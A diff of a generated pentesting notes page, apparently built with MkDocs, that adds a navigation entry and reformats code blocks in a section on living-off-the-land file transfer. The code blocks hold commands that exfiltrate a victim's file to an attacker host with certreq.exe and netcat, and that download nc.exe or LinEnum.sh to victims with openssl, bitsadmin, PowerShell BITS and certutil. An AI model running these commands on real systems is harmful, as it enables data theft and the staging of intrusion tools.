@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17148,37 +17171,50 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="windows-lolbas">Windows - LOLBAS</h2>
 <h3 id="certreqexe">CertReq.exe</h3>
 <p>Let's use <a href="https://lolbas-project.github.io/lolbas/Binaries/Certreq/">CertReq.exe</a> as an example.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># From the victim&#39;s machine we can sec for instance file.txt to our kali</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>certreq.exe<span class="w"> </span>-Post<span class="w"> </span>-config<span class="w"> </span>http://<span class="nv">$ipKali</span><span class="w"> </span>c:<span class="se">\f</span>older<span class="se">\f</span>ile.txt
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># From the kali machine, the attacking one, we use a netcat session</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>sudo<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">80</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1"># From the victim&#39;s machine we can sec for instance file.txt to our kali</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>certreq.exe<span class="w"> </span>-Post<span class="w"> </span>-config<span class="w"> </span>http://<span class="nv">$ipKali</span><span class="w"> </span>c:<span class="se">\f</span>older<span class="se">\f</span>ile.txt
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="c1"># From the kali machine, the attacking one, we use a netcat session</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>sudo<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="linux-gtfobins">Linux - GTFOBins</h2>
 <h3 id="openssl">OpenSSL</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Create Certificate in our attacker machine</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>openssl<span class="w"> </span>req<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-nodes<span class="w"> </span>-keyout<span class="w"> </span>key.pem<span class="w"> </span>-x509<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-out<span class="w"> </span>certificate.pem
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Stand up the Server in our attacker machine</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class="w"> </span>-accept<span class="w"> </span><span class="m">80</span><span class="w"> </span>-cert<span class="w"> </span>certificate.pem<span class="w"> </span>-key<span class="w"> </span>key.pem<span class="w"> </span>&lt;<span class="w"> </span>/tmp/LinEnum.sh
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># Download File to the victim&#39;s Machine, but run command from the attacker kali</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span><span class="nv">$ipVictim</span>:80<span class="w"> </span>-quiet<span class="w"> </span>&gt;<span class="w"> </span>LinEnum.sh
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span>
+<span class="normal"><a href="#__codelineno-1-7">7</a></span>
+<span class="normal"><a href="#__codelineno-1-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># Create Certificate in our attacker machine</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>openssl<span class="w"> </span>req<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-nodes<span class="w"> </span>-keyout<span class="w"> </span>key.pem<span class="w"> </span>-x509<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-out<span class="w"> </span>certificate.pem
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="c1"># Stand up the Server in our attacker machine</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class="w"> </span>-accept<span class="w"> </span><span class="m">80</span><span class="w"> </span>-cert<span class="w"> </span>certificate.pem<span class="w"> </span>-key<span class="w"> </span>key.pem<span class="w"> </span>&lt;<span class="w"> </span>/tmp/LinEnum.sh
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="c1"># Download File to the victim&#39;s Machine, but run command from the attacker kali</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span><span class="nv">$ipVictim</span>:80<span class="w"> </span>-quiet<span class="w"> </span>&gt;<span class="w"> </span>LinEnum.sh
+</span></code></pre></div></td></tr></table></div>
 <h2 id="other-common-living-off-the-land-tools">Other Common Living off the Land tools</h2>
 <h3 id="bitsadmin-download-function">Bitsadmin Download function</h3>
 <p>The <a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">Background Intelligent Transfer Service (BITS)</a> can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># File Download with Bitsadmin</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">bitsadmin</span> <span class="p">/</span><span class="n">transfer</span> <span class="n">wcb</span> <span class="p">/</span><span class="n">priority</span> <span class="n">foreground</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ip</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">htb-student</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c"># File Download with Bitsadmin</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="n">bitsadmin</span> <span class="p">/</span><span class="n">transfer</span> <span class="n">wcb</span> <span class="p">/</span><span class="n">priority</span> <span class="n">foreground</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ip</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">htb-student</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div></td></tr></table></div>
 <p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Download</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">Import-Module</span> <span class="n">bitstransfer</span><span class="p">;</span> <span class="nb">Start-BitsTransfer</span> <span class="n">-Source</span> <span class="s2">&quot;http://$ip/nc.exe&quot;</span> <span class="n">-Destination</span> <span class="s2">&quot;C:\Temp\nc.exe&quot;</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="c"># Download</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="nb">Import-Module</span> <span class="n">bitstransfer</span><span class="p">;</span> <span class="nb">Start-BitsTransfer</span> <span class="n">-Source</span> <span class="s2">&quot;http://$ip/nc.exe&quot;</span> <span class="n">-Destination</span> <span class="s2">&quot;C:\Temp\nc.exe&quot;</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="download-a-file-with-certutil">Download a File with Certutil</h3>
 <p>Certutil can be used to download arbitrary files.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>certutil.exe -verifyctl -split -f http://$ip/nc.exe
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>certutil.exe -verifyctl -split -f http://$ip/nc.exe
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17254,7 +17290,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
